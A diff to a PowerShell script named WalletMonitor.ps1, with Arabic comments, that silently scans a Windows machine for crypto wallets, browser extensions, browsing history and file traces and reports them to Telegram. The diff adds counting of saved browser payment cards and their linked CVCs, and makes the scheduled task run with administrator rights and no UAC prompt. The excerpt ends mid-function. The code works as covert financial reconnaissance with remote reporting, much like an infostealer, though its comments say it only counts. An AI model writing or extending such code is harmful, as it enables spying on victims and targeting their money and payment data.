@@ -1,4 +1,4 @@
-﻿#Requires -Version 5.1
+#Requires -Version 5.1
 <#
     WalletMonitor.ps1  ::  v3.0  (ملف واحد مستقل - Single File | بدون Python)
     ==================================================================
@@ -45,6 +45,8 @@ param(
     [switch]$NoNotify,
     [switch]$ResetState,
     [switch]$HistoryReport,
+    [switch]$CardReport,
+    [switch]$Elevate,
     [switch]$Install,
     [switch]$Uninstall,
     [switch]$TaskStatus,
@@ -59,7 +61,7 @@ try {
 } catch { }
 
 # ---- الوضع الصامت: لا مخرجات على الشاشة إلا مع -Console أو أوامر الإدارة ----
-$Script:ConsoleMode = [bool]($Console -or $Install -or $Uninstall -or $TaskStatus -or $TestNotify -or $HistoryReport -or $Help)
+$Script:ConsoleMode = [bool]($Console -or $Install -or $Uninstall -or $TaskStatus -or $TestNotify -or $HistoryReport -or $CardReport -or $Elevate -or $Help)
 if (-not $Script:ConsoleMode) { $ErrorActionPreference = 'SilentlyContinue' }
 
 # =====================================================================
@@ -79,6 +81,7 @@ $CONFIG = @{
 
     schedule = @{
         interval_minutes = 30
+        run_level        = 'highest'   # highest = المهمة تعمل بصلاحيات Administrator بصمت (بدون UAC) | limited = صلاحيات المستخدم
         daily_summary    = @{ enabled = $true; hour = 21 }
     }
 
@@ -87,6 +90,7 @@ $CONFIG = @{
         browser_extensions = $true
         browser_history    = $true
         filesystem         = $true
+        credit_cards       = $true
     }
 
     browser_history = @{
@@ -140,6 +144,13 @@ $CONFIG = @{
     firefox = @{
         enabled      = $true
         profile_root = '%APPDATA%\Mozilla\Firefox\Profiles'
+    }
+
+    # ---- بطاقات الدفع المحفوظة في المتصفحات (عدّ فقط — بدون أي استخراج) ----
+    credit_cards = @{
+        enabled          = $true
+        count_only       = $true      # إلزامي: عدّ فقط، لا يُقرأ أي رقم/اسم بطاقة ولا يُفكّ تشفير
+        notify_on_change = $true      # إشعار Telegram فقط عند تغيّر الأعداد
     }
 
     host_label = ''
@@ -255,6 +266,7 @@ $Script:HistoryHits = @()
 $Script:NewHistoryCount = 0
 $Script:HistoryStats = @()
 $Script:HistoryBrowsers = 0
+$Script:CardStats = @()
 
 # =====================================================================
 #  4)  أدوات مساعدة عامة
@@ -506,6 +518,7 @@ function Initialize-State {
         last_run         = ''
         last_summary_date = ''
         last_report_ts   = ''
+        card_sig         = ''
         seen             = @()
         daily            = @()
     }
@@ -552,7 +565,7 @@ function Register-Finding {
         -Silent: يسجّل في الحالة (لمنع التكرار) لكن لا يضيفها لقائمة الإرسال الفوري.
     #>
     param(
-        [ValidateSet('desktop', 'extension', 'history', 'file')][string]$Type,
+        [ValidateSet('desktop', 'extension', 'history', 'file', 'card')][string]$Type,
         [string]$Key,
         [string]$Label,
         [string]$Message,
@@ -584,7 +597,7 @@ function Add-DailyCounter {
     $entry = $null
     foreach ($d in $Script:State.daily) { if ($d.date -eq $today) { $entry = $d; break } }
     if (-not $entry) {
-        $entry = [PSCustomObject]@{ date = $today; desktop = 0; extension = 0; history = 0; file = 0 }
+        $entry = [PSCustomObject]@{ date = $today; desktop = 0; extension = 0; history = 0; file = 0; card = 0 }
         [void]$Script:State.daily.Add($entry)
     }
     $cur = [int](Get-Prop $entry $Type 0)
@@ -737,7 +750,36 @@ function Walk-TableBtree {
     }
 }
 
-function Get-SqliteTableData {
+function Get-SqliteColumnsFromSql {
+    <# يستخرج أسماء الأعمدة من جملة CREATE TABLE المخزّنة في sqlite_master. #>
+    param([string]$Sql)
+    $cols = New-Object System.Collections.Generic.List[string]
+    if ([string]::IsNullOrWhiteSpace($Sql)) { return @($cols.ToArray()) }
+    $open = $Sql.IndexOf('(')
+    $close = $Sql.LastIndexOf(')')
+    if ($open -lt 0 -or $close -le $open) { return @($cols.ToArray()) }
+    $inner = $Sql.Substring($open + 1, $close - $open - 1)
+    $parts = New-Object System.Collections.Generic.List[string]
+    $depth = 0; $cur = ''
+    foreach ($ch in $inner.ToCharArray()) {
+        if ($ch -eq '(' -or $ch -eq '[') { $depth++ }
+        elseif ($ch -eq ')' -or $ch -eq ']') { $depth-- }
+        if ($ch -eq ',' -and $depth -eq 0) { $parts.Add($cur); $cur = '' } else { $cur += $ch }
+    }
+    $parts.Add($cur)
+    foreach ($p in $parts) {
+        $tt = $p.Trim().Trim('"', '[', ']', '`')
+        if ($tt.Length -eq 0) { continue }
+        $name = ($tt -split '\s+')[0].Trim('"', '[', ']', '`')
+        $up = $name.ToUpperInvariant()
+        if ($up -in @('PRIMARY', 'UNIQUE', 'CHECK', 'FOREIGN', 'CONSTRAINT')) { continue }
+        $cols.Add($name)
+    }
+    return @($cols.ToArray())
+}
+
+function Get-SqliteInfo {
+    <# يحلّل هيدر الملف + sqlite_master ويرجّع بيانات الجدول (بدون فكّ أي صف). #>
     param([string]$Path, [string]$Table)
     $B = [System.IO.File]::ReadAllBytes($Path)
     if ($B.Length -lt 100 -or $B[0] -ne 0x53 -or $B[1] -ne 0x51) { throw "ليس ملف SQLite صالح: $Path" }
@@ -759,37 +801,121 @@ function Get-SqliteTableData {
     foreach ($r in $master) {
         if ($r.Count -ge 5 -and "$($r[1])" -eq $Table) { $rootPage = [int]$r[3]; $sql = "$($r[4])" }
     }
-    if ($rootPage -eq 0) { return @{ Columns = @(); Rows = @() } }
+    return @{
+        Bytes      = $B
+        PageSize   = $pageSize
+        Usable     = $usable
+        TotalPages = $totalPages
+        Enc        = $enc
+        RootPage   = $rootPage
+        Sql        = $sql
+    }
+}
 
+function Get-SqliteTableData {
+    param([string]$Path, [string]$Table)
+    $info = Get-SqliteInfo -Path $Path -Table $Table
+    if ($info.RootPage -eq 0) { return @{ Columns = @(); Rows = @() } }
     $rows = New-Object System.Collections.Generic.List[object]
-    Walk-TableBtree $B $rootPage $pageSize $usable $totalPages $enc $rows
+    Walk-TableBtree $info.Bytes $info.RootPage $info.PageSize $info.Usable $info.TotalPages $info.Enc $rows
+    return @{ Columns = @(Get-SqliteColumnsFromSql $info.Sql); Rows = $rows.ToArray() }
+}
 
-    $cols = @()
-    if ($sql) {
-        $open = $sql.IndexOf('(')
-        $close = $sql.LastIndexOf(')')
-        if ($open -ge 0 -and $close -gt $open) {
-            $inner = $sql.Substring($open + 1, $close - $open - 1)
-            $parts = New-Object System.Collections.Generic.List[string]
-            $depth = 0; $cur = ''
-            foreach ($ch in $inner.ToCharArray()) {
-                if ($ch -eq '(' -or $ch -eq '[') { $depth++ }
-                elseif ($ch -eq ')' -or $ch -eq ']') { $depth-- }
-                if ($ch -eq ',' -and $depth -eq 0) { $parts.Add($cur); $cur = '' }
-                else { $cur += $ch }
-            }
-            $parts.Add($cur)
-            foreach ($p in $parts) {
-                $tt = $p.Trim().Trim('"', '[', ']', '`')
-                if ($tt.Length -eq 0) { continue }
-                $name = ($tt -split '\s+')[0].Trim('"', '[', ']', '`')
-                $up = $name.ToUpperInvariant()
-                if ($up -in @('PRIMARY', 'UNIQUE', 'CHECK', 'FOREIGN', 'CONSTRAINT')) { continue }
-                $cols += $name
-            }
+function Get-SqliteLeafRefs {
+    <# يجمع مواقع/حجوم الـ payload في الصفحات الورقية فقط (بدون فكّ أي قيمة). #>
+    param([byte[]]$B, [int]$PageNum, [int]$PageSize, [int]$Usable, [int]$TotalPages,
+        [System.Collections.Generic.List[object]]$Refs, [int]$Depth = 0)
+    if ($PageNum -le 0 -or $PageNum -gt $TotalPages -or $Depth -gt 64) { return }
+    $info = Get-SqlitePageInfo $B $PageNum $PageSize $Usable
+    if ($info.Type -eq 13) {
+        for ($i = 0; $i -lt $info.NCell; $i++) {
+            $cellOff = [int](Read-BE $B ($info.PtrArray + $i * 2) 2)
+            $c = $info.Base + $cellOff
+            $pl = 0
+            $payloadLen = Read-Varint $B $c ([ref]$pl)
+            $rl = 0
+            $null = Read-Varint $B ($c + $pl) ([ref]$rl)
+            $Refs.Add(@{ Off = [long]($c + $pl + $rl); Len = [long]$payloadLen })
         }
     }
-    return @{ Columns = $cols; Rows = $rows.ToArray() }
+    elseif ($info.Type -eq 5) {
+        for ($i = 0; $i -lt $info.NCell; $i++) {
+            $cellOff = [int](Read-BE $B ($info.PtrArray + $i * 2) 2)
+            $child = [long](Read-BE $B ($info.Base + $cellOff) 4)
+            Get-SqliteLeafRefs $B ([int]$child) $PageSize $Usable $TotalPages $Refs ($Depth + 1)
+        }
+        if ($info.RightPtr -ne 0) { Get-SqliteLeafRefs $B $info.RightPtr $PageSize $Usable $TotalPages $Refs ($Depth + 1) }
+    }
+}
+
+function Get-SqliteRowCount {
+    <# يعدّ صفوف الجدول بعدّ خلايا الصفحات الورقية فقط — بدون قراءة أي payload. #>
+    param([byte[]]$B, [int]$PageNum, [int]$PageSize, [int]$Usable, [int]$TotalPages, [int]$Depth = 0)
+    if ($PageNum -le 0 -or $PageNum -gt $TotalPages -or $Depth -gt 64) { return 0 }
+    $info = Get-SqlitePageInfo $B $PageNum $PageSize $Usable
+    if ($info.Type -eq 13) { return [int]$info.NCell }
+    if ($info.Type -eq 5) {
+        $n = 0
+        for ($i = 0; $i -lt $info.NCell; $i++) {
+            $cellOff = [int](Read-BE $B ($info.PtrArray + $i * 2) 2)
+            $child = [long](Read-BE $B ($info.Base + $cellOff) 4)
+            $n += Get-SqliteRowCount $B ([int]$child) $PageSize $Usable $TotalPages ($Depth + 1)
+        }
+        if ($info.RightPtr -ne 0) { $n += Get-SqliteRowCount $B $info.RightPtr $PageSize $Usable $TotalPages ($Depth + 1) }
+        return $n
+    }
+    return 0
+}
+
+function Get-SqliteColumnValues {
+    <# يقرأ عمودًا نصيًا واحدًا فقط بالاسم؛ باقي الأعمدة تُتخطّى بايت-بايت بدون فكّ أو نسخ. #>
+    param([string]$Path, [string]$Table, [string]$Column)
+    $out = New-Object System.Collections.Generic.List[string]
+    $info = Get-SqliteInfo -Path $Path -Table $Table
+    if ($info.RootPage -eq 0) { return $out }
+    $cols = @(Get-SqliteColumnsFromSql $info.Sql)
+    $idx = -1
+    for ($i = 0; $i -lt $cols.Count; $i++) {
+        if ([string]$cols[$i] -ieq $Column) { $idx = $i; break }
+    }
+    if ($idx -lt 0) { return $out }
+
+    $refs = New-Object System.Collections.Generic.List[object]
+    Get-SqliteLeafRefs $info.Bytes $info.RootPage $info.PageSize $info.Usable $info.TotalPages $refs
+
+    foreach ($r in $refs) {
+        $payload = Read-PayloadLocal $info.Bytes ([int]$r.Off) $r.Len $info.PageSize $info.Usable $info.TotalPages
+        $n = 0
+        $hdrSize = Read-Varint $payload 0 ([ref]$n)
+        $body = [int]$hdrSize
+        $pos = $n
+        $k = 0
+        $found = $null
+        while ($pos -lt $hdrSize) {
+            $m = 0
+            $tp = Read-Varint $payload $pos ([ref]$m)
+            $sz = 0
+            if ($tp -ge 12) {
+                if (($tp % 2) -eq 0) { $sz = [int](($tp - 12) / 2) } else { $sz = [int](($tp - 13) / 2) }
+            }
+            elseif ($tp -eq 1) { $sz = 1 }
+            elseif ($tp -eq 2) { $sz = 2 }
+            elseif ($tp -eq 3) { $sz = 3 }
+            elseif ($tp -eq 4) { $sz = 4 }
+            elseif ($tp -eq 5) { $sz = 6 }
+            elseif ($tp -eq 6 -or $tp -eq 7) { $sz = 8 }
+            if ($k -eq $idx) {
+                # نستخرج العمود المطلوب فقط (نصي) ولا نلمس أي عمود آخر.
+                if ($tp -ge 13 -and ($tp % 2) -eq 1 -and $sz -gt 0) { $found = $info.Enc.GetString($payload, $body, $sz) }
+                break
+            }
+            $body += $sz
+            $pos += $m
+            $k++
+        }
+        if ($null -ne $found -and -not [string]::IsNullOrWhiteSpace($found)) { [void]$out.Add($found) }
+    }
+    return $out
 }
 
 function Copy-LockedFile {
@@ -1345,6 +1471,257 @@ function Get-HistoryHits {
     return @{ Hits = @($hits); Errors = @($errors); Stats = @($stats) }
 }
 
+# =====================================================================
+#  12.5)  فحص 4-ب: بطاقات الدفع المحفوظة (عدّ فقط — بدون أي استخراج)
+#        - Chromium/Edge/Brave/Vivaldi/Chromium: جدول credit_cards في "Web Data"
+#        - ربط CVV عبر جدول local_stored_cvc (مطابقة guid) — العدّ فقط
+#        - Firefox: ملف autofill-profiles.json (لا يخزّن CVV إطلاقًا)
+# =====================================================================
+
+function New-CardStat {
+    param([string]$Browser, [string]$Profile, [int]$Cards, [int]$CvvLinked, [bool]$CvvKnown, [string]$Source)
+    return [PSCustomObject]@{
+        Browser   = $Browser
+        Profile   = $Profile
+        Cards     = $Cards
+        CvvLinked = $CvvLinked
+        CvvKnown  = $CvvKnown
+        Source    = $Source
+    }
+}
+
+function Get-CardCountsFromSqlite {
+    <# عدّ البطاقات من "Web Data" + فحص ربط CVC. قراءة فقط وعدّ فقط:
+       يُعدّ صفوف credit_cards خلية-بخلية، ويُقرأ عمود guid وحده للمطابقة مع local_stored_cvc.
+       أعمدة الاسم/الرقم المشفَّر لا تُفكّ ولا تُنسخ ولا تُرسل. #>
+    param([string]$DbPath, [string]$TmpDir, [string]$CardsTable = 'credit_cards', [string]$CvvTable = 'local_stored_cvc')
+    $result = @{ Cards = 0; CvvLinked = 0; CvvKnown = $false; HasCvvTable = $false }
+    if (-not (Test-Path -LiteralPath $DbPath)) { return $result }
+    if ([string]::IsNullOrWhiteSpace($TmpDir)) { $TmpDir = New-TempDir }
+    $tmp = Join-Path $TmpDir ("cards_" + [guid]::NewGuid().ToString('N') + ".db")
+    try {
+        Copy-LockedFile -Source $DbPath -Dest $tmp
+
+        $info = Get-SqliteInfo -Path $tmp -Table $CardsTable
+        if ($info.RootPage -eq 0) { return $result }   # مفيش جدول بطاقات أصلاً
+        $result.Cards = [int](Get-SqliteRowCount $info.Bytes $info.RootPage $info.PageSize $info.Usable $info.TotalPages)
+        if ($result.Cards -le 0) { return $result }
+
+        # guid فقط — بدون أي عمود آخر
+        $cardGuids = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::Ordinal)
+        foreach ($g in @(Get-SqliteColumnValues -Path $tmp -Table $CardsTable -Column 'guid')) {
+            if (-not [string]::IsNullOrWhiteSpace($g)) { [void]$cardGuids.Add([string]$g) }
+        }
+
+        # هل فيه مخزّن CVC أصلاً؟ لو مفيش -> الحالة "غير مخزَّن" ومنخمّنش صفر.
+        $cvInfo = Get-SqliteInfo -Path $tmp -Table $CvvTable
+        if ($cvInfo.RootPage -eq 0) {
+            $result.CvvKnown = $false
+        } else {
+            $result.CvvKnown    = $true
+            $result.HasCvvTable = $true
+            if ($cardGuids.Count -gt 0) {
+                $matched = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::Ordinal)
+                foreach ($v in @(Get-SqliteColumnValues -Path $tmp -Table $CvvTable -Column 'guid')) {
+                    if (-not [string]::IsNullOrWhiteSpace($v) -and $cardGuids.Contains([string]$v)) { [void]$matched.Add([string]$v) }
+                }
+                $result.CvvLinked = $matched.Count
+            }
+        }
+    } finally {
+        if (Test-Path -LiteralPath $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
+    }
+    return $result
+}
+
+function Get-FirefoxCardCount {
+    <# عدّ البطاقات من autofill-profiles.json بعدّ مفاتيح guid داخل مصفوفة creditCards فقط.
+       الملف لا يُحوَّل إلى كائنات ولا تُقرأ أي حقول بطاقة. Firefox لا يخزّن CVC إطلاقًا. #>
+    param([string]$ProfileDir)
+    $f = Join-Path $ProfileDir 'autofill-profiles.json'
+    if (-not (Test-Path -LiteralPath $f)) { return $null }
+    $raw = [System.IO.File]::ReadAllText($f, [System.Text.Encoding]::UTF8)
+    $m = [regex]::Match($raw, '"creditCards"\s*:\s*\[', 'IgnoreCase')
+    if (-not $m.Success) { return @{ Cards = 0; CvvLinked = 0; CvvKnown = $true } }
+    $start = $m.Index + $m.Length
+    $depth = 1
+    $i = $start
+    $end = -1
+    while ($i -lt $raw.Length) {
+        $ch = $raw[$i]
+        if ($ch -eq '[') { $depth++ }
+        elseif ($ch -eq ']') { $depth--; if ($depth -eq 0) { $end = $i; break } }
+        $i++
+    }
+    if ($end -lt 0) { $end = $raw.Length }
+    $seg = if ($end -gt $start) { $raw.Substring($start, $end - $start) } else { '' }
+    $cards = ([regex]::Matches($seg, '"guid"\s*:', 'IgnoreCase')).Count
+    return @{ Cards = $cards; CvvLinked = 0; CvvKnown = $true }
+}
+
+function Invoke-BrowserCardScan {
+    <# يفحص كل المتصفحات ويعرف عدد البطاقات المحفوظة لكل بروفايل + هل هي مرتبطة بـ CVV. عدّ فقط. #>
+    Write-Log 'فحص بطاقات الدفع المحفوظة (عدّ فقط — بدون استخراج)...'
+    $Script:CardStats = @()
+    $ccCfg = Get-Prop $Script:Cfg 'credit_cards' $null
+    if (-not [bool](Get-Prop $ccCfg 'enabled' $true)) { Write-Log 'فحص البطاقات معطّل في الإعدادات.' 'DEBUG'; return }
+
+    $stats  = New-Object System.Collections.ArrayList
+    $errors = New-Object System.Collections.ArrayList
+    $tmpDir = New-TempDir
+    try {
+        # ---------- عائلة Chromium ----------
+        foreach ($br in @(Get-Prop $Script:Cfg 'chromium_browsers' @())) {
+            if (-not [bool](Get-Prop $br 'enabled' $true)) { continue }
+            $name = [string](Get-Prop $br 'name' 'Chromium')
+            $ud = Expand-PathString ([string](Get-Prop $br 'user_data' ''))
+            if (-not $ud -or -not (Test-Path -LiteralPath $ud)) { continue }
+
+            foreach ($prof in @(Get-ChromiumProfiles $ud)) {
+                $webData = Join-Path $prof.FullName 'Web Data'
+                if (-not (Test-Path -LiteralPath $webData)) { continue }
+                try {
+                    $r = Get-CardCountsFromSqlite -DbPath $webData -TmpDir $tmpDir
+                    if ($r.Cards -gt 0 -or $r.CvvLinked -gt 0) {
+                        [void]$stats.Add((New-CardStat -Browser $name -Profile $prof.Name -Cards $r.Cards -CvvLinked $r.CvvLinked -CvvKnown $r.CvvKnown -Source 'Web Data'))
+                    }
+                } catch {
+                    [void]$errors.Add("$name/$($prof.Name): $($_.Exception.Message)")
+                }
+            }
+        }
+
+        # ---------- Firefox ----------
+        $ff = Get-Prop $Script:Cfg 'firefox' $null
+        if ([bool](Get-Prop $ff 'enabled' $true)) {
+            $root = Expand-PathString ([string](Get-Prop $ff 'profile_root' ''))
+            if ($root -and (Test-Path -LiteralPath $root)) {
+                foreach ($prof in @(Get-ChildItem -LiteralPath $root -Directory -Force -ErrorAction SilentlyContinue)) {
+                    try {
+                        $r = Get-FirefoxCardCount -ProfileDir $prof.FullName
+                        if ($r -and $r.Cards -gt 0) {
+                            [void]$stats.Add((New-CardStat -Browser 'Firefox' -Profile $prof.Name -Cards $r.Cards -CvvLinked 0 -CvvKnown $true -Source 'autofill-profiles.json'))
+                        }
+                    } catch {
+                        [void]$errors.Add("Firefox/$($prof.Name): $($_.Exception.Message)")
+                    }
+                }
+            }
+        }
+    } finally {
+        Remove-Item -LiteralPath $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
+    }
+
+    foreach ($e in $errors) { Add-Error "cards: $e" }
+    $Script:CardStats = @($stats | Sort-Object Browser, Profile)
+    Write-Log "بروفايلات بها بطاقات محفوظة: $($Script:CardStats.Count)"
+}
+
+function Get-CardAggregate {
+    <# تجميع عدد البطاقات و CVV لكل متصفح (مجموع البروفايلات). #>
+    $groups = @{}
+    foreach ($s in @($Script:CardStats)) {
+        $b = [string]$s.Browser
+        if (-not $groups.ContainsKey($b)) {
+            $groups[$b] = [PSCustomObject]@{ Browser = $b; Cards = 0; CvvLinked = 0; CvvKnown = $false; Profiles = 0 }
+        }
+        $groups[$b].Cards     = [int]$groups[$b].Cards + [int]$s.Cards
+        $groups[$b].CvvLinked = [int]$groups[$b].CvvLinked + [int]$s.CvvLinked
+        $groups[$b].Profiles  = [int]$groups[$b].Profiles + 1
+        if ($s.CvvKnown) { $groups[$b].CvvKnown = $true }
+    }
+    return @($groups.Values | Sort-Object Cards -Descending)
+}
+
+function Get-CardSignature {
+    <# بصمة تُستخدم لكشف تغيّر أعداد البطاقات/ربط CVV بين الدورات. #>
+    $parts = New-Object System.Collections.ArrayList
+    foreach ($s in @($Script:CardStats | Sort-Object Browser, Profile)) {
+        [void]$parts.Add(("{0}|{1}|{2}|{3}" -f $s.Browser, $s.Profile, $s.Cards, $s.CvvLinked))
+    }
+    $raw = ($parts -join ';')
+    if ([string]::IsNullOrWhiteSpace($raw)) { $raw = 'no-cards' }
+    return (Get-Sha256Short $raw)
+}
+
+function Get-CardSummaryTotals {
+    $tot = 0; $cvv = 0
+    foreach ($s in @($Script:CardStats)) { $tot += [int]$s.Cards; $cvv += [int]$s.CvvLinked }
+    return @{ Cards = $tot; CvvLinked = $cvv }
+}
+
+function Build-CardReportLines {
+    <# يبني تقرير بطاقات احترافي (عدّ فقط). -Full يضيف تفاصيل كل بروفايل. #>
+    param([switch]$Full)
+    $lines = New-Object System.Collections.ArrayList
+    $agg   = @(Get-CardAggregate)
+    $tot   = Get-CardSummaryTotals
+    $ts    = (Get-Date).ToString('yyyy-MM-dd HH:mm')
+
+    [void]$lines.Add('💳 <b>بطاقات الدفع المحفوظة — WalletMonitor</b>')
+    [void]$lines.Add('━━━━━━━━━━━━━━━━')
+    [void]$lines.Add("🖥 الجهاز: <code>$(ConvertTo-HtmlSafe $Script:HostLabel)</code> · 👤 $([System.Environment]::UserName)")
+    [void]$lines.Add("🕒 وقت التقرير: $ts")
+    [void]$lines.Add('🔒 <i>عدّ فقط — لا يُستخرج ولا يُخزَّن ولا يُرسل أي رقم بطاقة أو اسم، ولا يُفكّ أي تشفير.</i>')
+
+    if ($agg.Count -eq 0) {
+        [void]$lines.Add('')
+        [void]$lines.Add('ℹ️ لا توجد بطاقات دفع محفوظة في أي متصفح مدعوم.')
+        return @($lines)
+    }
+
+    [void]$lines.Add('')
+    [void]$lines.Add("📊 الإجمالي: <b>$($tot.Cards)</b> بطاقة · مرتبطة بـ CVC: <b>$($tot.CvvLinked)</b> · بروفايلات بها بطاقات: <b>$(@($Script:CardStats).Count)</b>")
+    [void]$lines.Add('')
+    [void]$lines.Add('🌐 <b>لكل متصفح:</b>')
+    foreach ($g in $agg) {
+        $cvvTxt = 'CVC: غير متاح (لا يوجد مخزّن)'
+        if ($g.CvvLinked -gt 0) { $cvvTxt = "مرتبطة بـ CVC: <b>$($g.CvvLinked)</b>" }
+        elseif ($g.CvvKnown) { $cvvTxt = 'CVC غير مخزَّن' }
+        [void]$lines.Add("   • $(ConvertTo-HtmlSafe $g.Browser): بطاقات <b>$($g.Cards)</b> · $cvvTxt · بروفايلات $($g.Profiles)")
+    }
+
+    if (-not $Full) { return @($lines) }
+
+    foreach ($g in $agg) {
+        [void]$lines.Add('')
+        [void]$lines.Add('━━━━━━━━━━━━━━━━')
+        [void]$lines.Add("🌐 <b>$(ConvertTo-HtmlSafe $g.Browser)</b> — تفاصيل البروفايلات")
+        foreach ($s in @($Script:CardStats | Where-Object { $_.Browser -eq $g.Browser })) {
+            $cvvTxt = 'CVC: غير متاح'
+            if ($s.CvvLinked -gt 0) { $cvvTxt = "CVC مرتبط: $($s.CvvLinked)" }
+            elseif ($s.CvvKnown) { $cvvTxt = 'CVC غير مخزَّن' }
+            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $s.Profile): بطاقات $($s.Cards) · $cvvTxt")
+        }
+    }
+
+    [void]$lines.Add('')
+    [void]$lines.Add('━━━━━━━━━━━━━━━━')
+    [void]$lines.Add('ℹ️ <i>Chromium (Chrome/Edge/Brave/Vivaldi/Chromium): العدّ بعدّ صفوف جدول credit_cards خلية-بخلية، وربط CVC يُفحص من وجود جدول local_stored_cvc بمطابقة guid فقط.')
+    [void]$lines.Add('لا تُفكّ أي قيم بطاقة: يُقرأ عمود guid وحده، وباقي الأعمدة (الاسم/الرقم المشفَّر) تُتخطّى بايت-بايت بدون فكّ ولا تخزين.')
+    [void]$lines.Add('Firefox: العدّ بعدّ مفاتيح guid داخل مصفوفة creditCards نصيًا. Chromium و Firefox لا يحفظان CVC/CVV افتراضًا؛ "مرتبط" تُبلَّغ فقط عند وجود مخزّن CVV فعلي.</i>')
+    return @($lines)
+}
+
+function Send-CardReport {
+    param([switch]$Force, [switch]$Full)
+    $ccCfg = Get-Prop $Script:Cfg 'credit_cards' $null
+    if (-not $Force -and -not [bool](Get-Prop $ccCfg 'notify_on_change' $true)) { return }
+    $maxChars = [int](Get-Prop (Get-Prop (Get-Prop $Script:Cfg 'browser_history') 'report') 'max_message_chars' 3500)
+    $lines = Build-CardReportLines -Full:$Full
+    if (@($lines).Count -eq 0) { return }
+    $chunks = @(Split-MessageChunks -Lines $lines -MaxChars $maxChars)
+    $total = $chunks.Count
+    $sentAll = $true
+    for ($i = 0; $i -lt $total; $i++) {
+        $prefix = ''
+        if ($total -gt 1) { $prefix = "📄 [$($i + 1)/$total]`n" }
+        if (-not (Send-TelegramMessage -Text ($prefix + $chunks[$i]))) { $sentAll = $false }
+    }
+    if ($sentAll) { Write-Log "تم إرسال تقرير البطاقات ($total رسالة)." }
+    else { Write-Log 'فشل إرسال جزء من تقرير البطاقات.' 'ERROR' }
+}
+
 function Invoke-BrowserHistoryScan {
     Write-Log 'فحص تاريخ المتصفحات (قارئ PowerShell مباشر - كل المتصفحات)...'
     $Script:HistoryHits     = @()
@@ -1630,6 +2007,20 @@ function Build-HistoryReportLines {
         }
     }
 
+    # بطاقات الدفع المحفوظة (عدّ فقط - بدون أي استخراج)
+    $ccSumCfg = Get-Prop $Script:Cfg 'credit_cards' $null
+    if ([bool](Get-Prop $ccSumCfg 'enabled' $true) -and @($Script:CardStats).Count -gt 0) {
+        $cAgg = @(Get-CardAggregate)
+        $cTot = Get-CardSummaryTotals
+        [void]$lines.Add('')
+        [void]$lines.Add('━━━━━━━━━━━━━━━━')
+        [void]$lines.Add("💳 <b>بطاقات الدفع المحفوظة</b> (عدّ فقط) — إجمالي: <b>$($cTot.Cards)</b>")
+        foreach ($g in $cAgg) {
+            $cvvTxt = if ($g.CvvKnown) { "CVV مرتبط: $($g.CvvLinked)" } else { 'CVV: غير معروف' }
+            [void]$lines.Add("   • $(ConvertTo-HtmlSafe $g.Browser): بطاقات <b>$($g.Cards)</b> · $cvvTxt")
+        }
+    }
+
     # الأقسام (كل تصنيف مرتب)
     foreach ($cat in @('wallet', 'exchange', 'dapp', 'crypto', 'other')) {
         if ($include -notcontains $cat) { continue }
@@ -1770,12 +2161,13 @@ function Send-NewFindings {
 
     Write-Log "عدد الاكتشافات الجديدة: $($items.Count)"
 
-    $order = @{ 'desktop' = 1; 'extension' = 2; 'file' = 3; 'history' = 4 }
+    $order = @{ 'desktop' = 1; 'extension' = 2; 'file' = 3; 'history' = 4; 'card' = 5 }
     $items = @($items | Sort-Object @{ Expression = { [int]$order[$_.Type] } }, @{ Expression = { $_.Label } })
 
     $d = @($items | Where-Object { $_.Type -eq 'desktop' }).Count
     $x = @($items | Where-Object { $_.Type -eq 'extension' }).Count
     $f = @($items | Where-Object { $_.Type -eq 'file' }).Count
+    $cd = @($items | Where-Object { $_.Type -eq 'card' }).Count
 
     # رسالة تجميعية أولاً (فرز سريع للنظرة العامة)
     $head = @()
@@ -1787,6 +2179,7 @@ function Send-NewFindings {
     $head += "🔴 محافظ سطح مكتب: $d"
     $head += "🟠 إضافات متصفح: $x"
     $head += "🔵 آثار ملفات: $f"
+    if ($cd -gt 0) { $head += "💳 البطاقات المحفوظة: تغيّر في $cd مجموعة" }
     if ($Script:NewHistoryCount -gt 0) { $head += "🟡 زيارات مواقع جديدة: $($Script:NewHistoryCount) (تظهر في تقرير التاريخ)" }
     [void](Send-TelegramMessage -Text ($head -join "`n"))
     $Script:SentCount++
@@ -1930,10 +2323,13 @@ function Install-Task {
             -MultipleInstances IgnoreNew `
             -ExecutionTimeLimit (New-TimeSpan -Hours 1)
 
+        $runLevel = [string](Get-Prop (Get-Prop $Script:Cfg 'schedule') 'run_level' 'highest')
+        if ($runLevel -notin @('highest', 'limited')) { $runLevel = 'highest' }
+
         $principal = New-ScheduledTaskPrincipal `
             -UserId "$env:USERDOMAIN\$env:USERNAME" `
             -LogonType Interactive `
-            -RunLevel Limited
+            -RunLevel $runLevel
 
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
             -Settings $settings -Principal $principal -Force `
@@ -1942,6 +2338,8 @@ function Install-Task {
         Write-Console "تم تسجيل المهمة '$taskName' بنجاح." -ForegroundColor Green
         Write-Console "أول تشغيل: $((Get-Date).AddMinutes(2).ToString('yyyy-MM-dd HH:mm'))"
         Write-Console "التكرار: كل $Minutes دقيقة"
+        Write-Console "مستوى التشغيل: $runLevel"
+        if ($runLevel -eq 'highest') { Write-Console 'المهمة تعمل بصلاحيات Administrator وبصمت عند كل دورة (بدون نافذة وبدون UAC).' -ForegroundColor Green }
         Write-Console 'ملاحظة: المهمة تعمل فقط عندما يكون المستخدم مسجّل الدخول (LogonType Interactive).'
     } catch {
         Write-Console "فشل تسجيل المهمة: $($_.Exception.Message)" -ForegroundColor Red
@@ -2011,6 +2409,25 @@ function Invoke-FullScan {
         catch { Add-Error "فشل فحص نظام الملفات: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR' }
     }
 
+    if ([bool](Get-Prop $scanCfg 'credit_cards' $true)) {
+        try {
+            Invoke-BrowserCardScan
+            $ccCfg = Get-Prop $Script:Cfg 'credit_cards' $null
+            if ([bool](Get-Prop $ccCfg 'notify_on_change' $true)) {
+                $sig  = Get-CardSignature
+                $prev = [string]$Script:State.card_sig
+                # أول دورة تسجّل البصمة بصمت؛ الإشعار فقط عند تغيّر الأعداد/ربط CVV.
+                if ($prev -and $prev -ne $sig) {
+                    $msg = (Build-CardReportLines -Full) -join "`n"
